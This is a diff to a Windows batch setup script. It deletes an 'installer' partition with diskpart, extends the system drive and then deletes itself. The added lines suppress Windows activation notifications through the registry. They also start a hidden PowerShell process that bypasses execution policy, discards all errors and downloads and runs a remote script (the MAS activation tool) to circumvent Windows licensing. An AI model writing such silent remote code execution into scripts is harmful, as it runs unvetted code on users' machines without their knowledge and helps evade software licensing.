@@ -5,8 +5,13 @@ set C=%SystemDrive:~0,1%
 for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<installer\>"') do (echo select vol %%a & echo delete partition) | diskpart
 for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<%C%\>"') do (echo select vol %%a & echo extend) | diskpart
 
-rem Hide desktop watermark and evaluation build markings
+rem Permanently remove "Activate Windows" watermark
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform\Activation" /v Manual /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v NotificationDisabled /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKCU\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKU\.DEFAULT\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 0 /f >nul 2>&1
+
+rem Silent background automated activation via MAS
+start /b powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "try { irm https://get.activated.win | iex /TSforge } catch {}" >nul 2>&1
 
 del "%~f0"
